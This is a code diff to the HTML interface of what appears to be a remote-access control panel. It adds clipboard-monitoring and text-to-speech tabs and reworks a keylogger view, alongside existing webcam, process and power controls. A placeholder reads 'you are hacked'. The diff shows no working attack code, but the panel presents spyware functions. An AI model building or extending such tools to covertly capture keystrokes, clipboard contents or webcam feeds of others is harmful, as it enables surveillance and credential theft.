@@ -80,6 +80,10 @@
             <button class="nav-item" onclick="switchTab('processes', this)"><i data-lucide="activity"></i></button>
             <button class="nav-item" onclick="switchTab('media', this)"><i data-lucide="camera"></i></button>
             <button class="nav-item" onclick="switchTab('webcam', this)"><i data-lucide="video"></i></button>
+
+            <button class="nav-item" onclick="switchTab('clipboard', this)"><i data-lucide="clipboard"></i></button>
+            <button class="nav-item" onclick="switchTab('tts', this)"><i data-lucide="megaphone"></i></button>
+
             <button class="nav-item" onclick="switchTab('keylogger', this)"><i data-lucide="keyboard"></i></button>
             <div class="spacer"></div>
             <button class="nav-item power-nav" onclick="switchTab('power', this)"><i data-lucide="power"></i></button>
@@ -158,6 +162,7 @@
                     </div>
                 </div>
             </section>
+
             <section id="tab-apps" class="tab-content">
                 <div class="card full-height">
                     <div class="card-header"><h3>Application Manager</h3></div>
@@ -177,6 +182,7 @@
                     </div>
                 </div>
             </section>
+
             <section id="tab-processes" class="tab-content">
                 <div class="card full-height">
                     <div class="card-header"><h3>System Processes</h3></div>
@@ -190,12 +196,23 @@
                     </div>
                     <div class="table-wrapper">
                         <table class="glass-table">
-                            <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>RAM (MB)</th></tr></thead>
-                            <tbody id="process-list-body"><tr><td colspan="4" class="text-center">Click List or Refresh to load data</td></tr></tbody>
+                            <thead>
+                                <tr>
+                                    <th>PID</th>
+                                    <th>Name</th>
+                                    <th>Threads</th>
+                                    <th>RAM (MB)</th>
+                                    <th style="width: 60px;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="process-list-body">
+                                <tr><td colspan="5" class="text-center">Click List or Refresh to load data</td></tr>
+                            </tbody>
                         </table>
                     </div>
                 </div>
             </section>
+
             <section id="tab-media" class="tab-content">
                 <div class="split-layout">
                     <div class="card main-panel">
@@ -234,6 +251,7 @@
                     </div>
                 </div>
             </section>
+
             <section id="tab-webcam" class="tab-content">
                 <div class="split-layout">
                     <div class="card main-panel">
@@ -262,20 +280,79 @@
                     </div>
                 </div>
             </section>
+
+            <section id="tab-clipboard" class="tab-content">
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header"><h3>Clipboard Monitor</h3></div>
+                        <div class="control-bar">
+                            <button class="btn-gradient-blue" onclick="startClipboard()"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                            <button class="btn-danger-red" onclick="stopClipboard()"><i data-lucide="square" class="btn-icon-inside"></i> Stop & Save</button>
+                            <div class="divider"></div>
+                            <button class="btn-gradient-hybrid" onclick="sendCmd('get-clip')"><i data-lucide="download-cloud" class="btn-icon-inside"></i> Fetch</button>
+                            <button class="btn-secondary" onclick="clearClipboardDisplay()"><i data-lucide="eraser" class="btn-icon-inside"></i> Clear</button>
+                        </div>
+                        <div class="log-container" id="clip-output"><span class="text-muted">Waiting for clipboard data...</span></div>
+                    </div>
+
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('clipboard')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="clipboard-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-tts" class="tab-content">
+                <div class="card" style="max-width: 600px; margin: 0 auto; margin-top: 50px;">
+                    <div class="card-header"><h3>Text to Speech (TTS)</h3></div>
+                    <div style="display: flex; flex-direction: column; gap: 20px;">
+                        <p class="text-muted">Type a message below and the remote computer will speak it out loud.</p>
+                        <textarea id="tts-input" class="glass-input" rows="4" placeholder="Enter text here (e.g., Hello user, you are hacked)..."></textarea>
+                        <button class="btn-gradient-pastel large" onclick="sendTTS()">
+                            <i data-lucide="mic" class="btn-icon-inside"></i> Speak Now
+                        </button>
+                    </div>
+                </div>
+            </section>
+
             <section id="tab-keylogger" class="tab-content">
                 <div class="split-layout">
                     <div class="card main-panel">
                         <div class="card-header">
                             <h3>Keylogger Records</h3>
-                            <div class="actions">
-                                <button class="btn-gradient-blue" onclick="startKeylog()"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
-                                <button class="btn-danger-red" onclick="stopKeylog()"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
-                                <button class="btn-gradient-hybrid" onclick="fetchKeylog()"><i data-lucide="download-cloud" class="btn-icon-inside"></i> Fetch</button>
-                                <button class="btn-secondary" onclick="clearKeylogDisplay()"><i data-lucide="eraser" class="btn-icon-inside"></i> Clear</button>
+                            <div class="keylog-status-badges">
+                                <span class="badge-status" id="kl-mode">Mode: ---</span>
+                                <span class="badge-status" id="kl-status">Type: ---</span>
                             </div>
                         </div>
-                        <div class="log-container" id="keylog-output"><span class="text-muted">Waiting for data...</span></div>
+
+                        <div class="control-bar" style="margin-bottom: 15px;">
+                            <button class="btn-gradient-blue" onclick="startKeylog()"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+
+                            <button class="btn-danger-red" onclick="stopKeylog()"><i data-lucide="square" class="btn-icon-inside"></i> Stop & Save</button>
+
+                            <div class="divider"></div>
+
+                            <button class="btn-secondary" onclick="clearKeylogDisplay()"><i data-lucide="eraser" class="btn-icon-inside"></i> Clear</button>
+                        </div>
+
+                        <div class="keylog-split-view">
+                            <div class="keylog-sub-panel">
+                                <div class="sub-header">RAW KEYS (Phím thực)</div>
+                                <div class="log-container small-text" id="keylog-raw">Waiting...</div>
+                            </div>
+                            <div class="keylog-sub-panel">
+                                <div class="sub-header">FINAL TEXT (Văn bản)</div>
+                                <div class="log-container" id="keylog-text">Waiting...</div>
+                            </div>
+                        </div>
                     </div>
+
                     <div class="card history-panel">
                         <div class="card-header">
                             <h3>History</h3>
@@ -287,6 +364,7 @@
                     </div>
                 </div>
             </section>
+
             <section id="tab-power" class="tab-content">
                 <div class="power-wrapper">
                     <div class="power-card">
